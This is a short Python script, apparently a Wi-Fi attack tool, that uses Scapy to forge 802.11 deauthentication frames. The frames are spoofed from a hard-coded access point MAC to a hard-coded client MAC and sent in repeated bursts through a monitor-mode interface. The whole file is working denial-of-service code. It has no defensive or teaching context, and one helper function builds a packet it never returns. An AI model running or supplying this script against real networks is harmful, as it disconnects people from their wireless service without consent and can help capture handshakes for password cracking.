from scapy.all import *


interface = 'wlp5s0mon'
AP_MAC = '68:FF:7B:88:07:5C'
Channel = 2
target = '98:B8:BA:93:4A:54'

def deauth_specific_victim():
    packet = RadioTap()/Dot11(addr1=target, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
    return packet

def deauth_ap():
    packe_ap = RadioTap()/Dot11(addr1=AP_MAC, addr2=target, addr3=target)/Dot11Deauth()

def attack_module():
    pkt = deauth_specific_victim()
    sendp(pkt, iface = interface, count = 20, inter= .001)

def main():
    while True:
        attack_module()

for i in range(1, 100):
    attack_module()